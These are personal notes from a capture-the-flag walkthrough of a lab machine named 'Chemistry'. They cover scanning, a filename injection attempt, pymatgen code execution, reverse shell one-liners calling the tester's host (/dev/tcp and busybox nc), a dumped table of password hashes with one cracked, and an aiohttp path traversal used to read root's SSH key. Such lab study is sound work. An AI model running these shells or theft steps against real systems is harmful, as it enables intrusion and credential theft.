___

## Enumeration

## Port 80 - HTTP (Apache)
Warning: 10.10.11.38 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.38
Host is up, received echo-reply ttl 63 (0.16s latency).
Scanned at 2025-01-14 21:23:23 EST for 539s
Not shown: 65238 closed tcp ports (reset), 295 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCj5eCYeJYXEGT5pQjRRX4cRr4gHoLUb/riyLfCAQMf40a6IO3BMzwyr3OnfkqZDlr6o9tS69YKDE9ZkWk01vsDM/T1k/m1ooeOaTRhx2Yene9paJnck8Stw4yVWtcq6PPYJA3HxkKeKyAnIVuYBvaPNsm+K5+rsafUEc5FtyEGlEG0YRmyk/NepEFU6qz25S3oqLLgh9Ngz4oGeLudpXOhD4gN6aHnXXUHOXJgXdtY9EgNBfd8paWTnjtloAYi4+ccdMfxO7PcDOxt5SQan1siIkFq/uONyV+nldyS3lLOVUCHD7bXuPemHVWqD2/1pJWf+PRAasCXgcUV+Je4fyNnJwec1yRCbY3qtlBbNjHDJ4p5XmnIkoUm7hWXAquebykLUwj7vaJ/V6L19J4NN8HcBsgcrRlPvRjXz0A2VagJYZV+FVhgdURiIM4ZA7DMzv9RgJCU2tNC4EyvCTAe0rAM2wj0vwYPPEiHL+xXHGSvsoZrjYt1tGHDQvy8fto5RQU=
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLzrl552bgToHASFlKHFsDGrkffR/uYDMLjHOoueMB9HeLRFRvZV5ghoTM3Td9LImvcLsqD84b5n90qy3peebL0=
|   256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIELLgwg7A8Kh8AxmiUXeMe9h/wUnfdoruCJbWci81SSB
5000/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-title: Chemistry - Home
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 14 21:32:22 2025 -- 1 IP address (1 host up) scanned in 539.34 seconds


---

200      GET       29l       57w      926c http://10.10.11.38:5000/login
200      GET       29l       57w      931c http://10.10.11.38:5000/register
200      GET      126l      277w     2312c http://10.10.11.38:5000/static/styles.css
200      GET       22l       61w      719c http://10.10.11.38:5000/
405      GET        5l       20w      153c http://10.10.11.38:5000/upload
302      GET        5l       22w      229c http://10.10.11.38:5000/logout => http://10.10.11.38:5000/login?next=%2Flogout
302      GET        5l       22w      235c http://10.10.11.38:5000/dashboard => http://10.10.11.38:5000/login?next=%2Fdashboard
[####################] - 3m     30004/30004   0s      found:7       errors:0      
[####################] - 3m     30000/30000   192/s   http://10.10.11.38:5000/    


# maybe the backend is using some python like this (passing file to library)
```java
from pymatgen import Structure
ges_structure = Structure.from_file("GeS.cif")
ges_structure.to(filename="GeS.json")
```

Tried uploading file name this:

 'test.cif");import time;time.sleep(10000000)#.cif'

file name got cleaned to this:

test.cifimport_timetime.sleep10000000.cif


# characters being cleaned from input:

" (  )  ; #
space replaced with _


try to ping  my machine with the command and see what happens;
when attempting to see the file I am getting internal server error


Things to check:
check what characters i can put in file name
check werkgz and python server versions + nmap scan versions


https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f

this works!!! for executing shell commands, i can ping my machine but shell 
causes server error

# getting shell to work

shit was so mid this shell worked:  (it was crashing out cause of - char i think?)

0<&196;exec 196<>/dev/tcp/10.10.14.32/443; sh <&196 >&196 2>&196

maybe filtering for it??

JK IT NO WORK TRY READLINE ALSO WHY NO WORK?

busybox nc 10.10.14.32 4444 -e /bin/bash

this shell works (fr this time) bruh


# found creds inside app.py for database

app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}

There is a www-data-user
also 
127.0.0.1:8080 running on localhost

# this file looks interesting:
-rw-r--r-- 1 rosa rosa 0 Jun 15  2024 /home/rosa/.sudo_as_admin_successful


# hosts file
chemistry
127.0.0.1 localhost
127.0.1.1 chemistry


# sqlite database users table

sqlite> select * from user; 
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|q|7694f4a66316e53c8cdd9d9954bd611d


# threw rose hash in crackstation.com

| hash                             | type | pass              |
| -------------------------------- | ---- | ----------------- |
| 63ed86ee9f624c7b14f1d4f43dc251a5 | md5  | unicorniosrosados |
|                                  |      |                   |
|                                  |      |                   |

unicorniosrosados
# rosa user notes

This interesting:
-rw-r--r-- 1 rosa rosa 0 Jun 15  2024 /home/rosa/.sudo_as_admin_successful

also website running in port 8080 accessible by rosa

#expose_website_on_public_ip
ssh -L 10.10.14.38:8080:localhost:8080 user@localhost

# looking at script.js file in website
you can see directory /list_services which is returning json to be displayed in the site

looking at response headers you can see :

| Server | Python/3.9 aiohttp/3.9.1 | version |
| ------ | ------------------------ | ------- |
# CVE-2024-23334-PoC
A proof of concept of the path traversal vulnerability in the python AioHTTP library =< 3.9.1

https://github.com/z3rObyte/CVE-2024-23334-PoC

# this works !!!! 
# note: the static directory is name /assets so that needs to be modified in the script


since the script is running as root to list processes running on machine we can read the /root/.ssh/id_rsa private key ssh file 

# now have root! that it

